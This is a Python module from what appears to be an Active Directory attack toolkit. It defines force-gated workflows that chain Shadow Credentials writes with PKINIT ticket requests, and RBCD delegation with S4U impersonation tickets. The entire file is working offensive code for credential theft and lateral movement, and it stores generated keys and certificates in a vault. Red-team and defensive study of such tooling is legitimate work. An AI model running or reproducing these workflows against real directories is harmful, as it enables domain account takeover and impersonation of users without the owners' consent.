"""Force-gated wrappers that join existing evidence and ticket capabilities."""

from __future__ import annotations

import json
from typing import Any

from adaf_attack.capabilities.pkinit_auth import PkinitAuth
from adaf_attack.capabilities.rbcd import Rbcd
from adaf_attack.capabilities.s4u_abuse import S4uAbuse
from adaf_attack.capabilities.shadow_creds import ShadowCreds
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target


@register_capability(
    id="shadow-pkinit-workflow",
    summary="Write Shadow Credential then request PKINIT TGT (requires --force)",
    destructive=True,
    category="credential-access",
    tags=("shadow-credentials", "pkinit", "workflow"),
)
class ShadowPkinitWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        sam = kwargs.get("write_target") or kwargs.get("sam")
        if not force or not sam:
            raise RuntimeError("shadow-pkinit-workflow requires --force and --write-target/--sam")
        shadow = ShadowCreds().run(target, session, graph, force=True, write_target=sam)
        write = shadow.get("write_attempt") or {}
        if not write.get("ok"):
            return {"ok": False, "shadow": write, "pkinit": {"skipped": "shadow_write_failed"}}
        vault = session.vault()
        try:
            vault.put(
                "shadow-certificate",
                "pem",
                {"key": write.get("key_pem"), "cert": write.get("cert_pem")},
                secret=True,
                metadata={"sam": sam},
            )
        except Exception as exc:
            session.log("vault.store_skipped", reason=str(exc), workflow="shadow-pkinit")
        pkinit = PkinitAuth().run(
            target, session, graph, force=True, include_secrets=include_secrets, sam=sam
        )
        result = {"ok": bool(pkinit.get("ok")), "shadow": write, "pkinit": pkinit}
        session.path("shadow-pkinit-workflow.json").write_text(
            json.dumps(result, indent=2, default=str) + "\n", encoding="utf-8"
        )
        session.log("shadow-pkinit-workflow.complete", ok=result["ok"], sam=sam)
        return result


def _controlled_computer_target(
    target: Target, set_from: str, kwargs: dict[str, Any]
) -> Target | None:
    """Build a Target authenticated as the RBCD-controlled computer account."""
    sam = str(set_from)
    if not sam.endswith("$"):
        sam = sam + "$"
    password = kwargs.get("computer_password") or kwargs.get("controlled_password")
    hashes = kwargs.get("computer_hashes") or kwargs.get("controlled_hashes")
    aes_key = kwargs.get("computer_aes") or kwargs.get("controlled_aes")
    ccache = kwargs.get("computer_ccache") or kwargs.get("controlled_ccache")

    # Reuse the engagement identity when it already is the controlled computer.
    if target.username and str(target.username).upper().rstrip("$") == sam.upper().rstrip("$"):
        if target.has_credentials:
            return Target(
                domain=target.domain,
                dc_ip=target.dc_ip,
                username=sam,
                password=password or target.password,
                hashes=hashes or target.hashes,
                aes_key=aes_key or target.aes_key,
                ccache=ccache or target.ccache,
                use_kerberos=bool(ccache or target.ccache or target.use_kerberos),
                ldaps=target.ldaps,
                port=target.port,
            )

    if not (password or hashes or aes_key or ccache):
        return None
    return Target(
        domain=target.domain,
        dc_ip=target.dc_ip,
        username=sam,
        password=password,
        hashes=hashes,
        aes_key=aes_key,
        ccache=ccache,
        use_kerberos=bool(ccache),
        ldaps=target.ldaps,
        port=target.port,
    )


@register_capability(
    id="rbcd-ticket-workflow",
    summary="Set RBCD then request an S4U service ticket as the controlled computer",
    destructive=True,
    category="lateral-movement",
    tags=("rbcd", "s4u", "ccache", "workflow"),
)
class RbcdTicketWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        set_on, set_from, impersonate = (
            kwargs.get("set_on"),
            kwargs.get("set_from"),
            kwargs.get("impersonate"),
        )
        if not force or not all((set_on, set_from, impersonate)):
            raise RuntimeError(
                "rbcd-ticket-workflow requires --force, --set-on, --set-from, and --impersonate"
            )
        rbcd = Rbcd().run(target, session, graph, force=True, set_on=set_on, set_from=set_from)
        write = rbcd.get("set_attempt") or {}
        result: dict[str, Any] = {
            "ok": False,
            "rbcd": write,
            "ticket": {"skipped": "rbcd_set_failed"},
        }
        if write.get("ok"):
            spn = str(kwargs.get("spn") or f"cifs/{str(set_on).rstrip('$')}")
            computer = _controlled_computer_target(target, str(set_from), kwargs)
            if computer is not None:
                s4u = S4uAbuse().run(
                    computer,
                    session,
                    graph,
                    force=True,
                    impersonate=impersonate,
                    spn=spn,
                    additional_ticket=kwargs.get("additional_ticket"),
                    altservice=kwargs.get("altservice"),
                )
                result["ticket"] = {
                    "requested": True,
                    "spn": spn,
                    "impersonate": impersonate,
                    "controller": computer.username,
                    "ccache_paths": s4u.get("ccache_paths") or [],
                    "s4u": s4u,
                }
                result["ok"] = bool(s4u.get("ccache_paths"))
            else:
                playbook = session.path("rbcd-s4u.playbook.txt")
                playbook.write_text(
                    (
                        f"# S4U request for {impersonate}\n"
                        f"# SPN: {spn}\n"
                        f"# Controlled computer: {set_from}\n"
                        "# Provide computer credentials via "
                        "-P computer_password= / computer_hashes= / computer_ccache=\n"
                        "# then re-run, or invoke s4u-abuse directly as the computer account.\n"
                    ),
                    encoding="utf-8",
                )
                result["ticket"] = {
                    "requested": False,
                    "spn": spn,
                    "playbook": str(playbook),
                    "note": (
                        "RBCD set succeeded but no controlled-computer credential was "
                        "supplied; pass -P computer_password=/computer_hashes=/computer_ccache= "
                        "to execute S4U in-process."
                    ),
                }
                result["handoff_complete"] = True
        session.path("rbcd-ticket-workflow.json").write_text(
            json.dumps(result, indent=2, default=str) + "\n", encoding="utf-8"
        )
        session.log(
            "rbcd-ticket-workflow.complete",
            ok=result["ok"],
            handoff_complete=result.get("handoff_complete", False),
            set_on=set_on,
            set_from=set_from,
        )
        return result
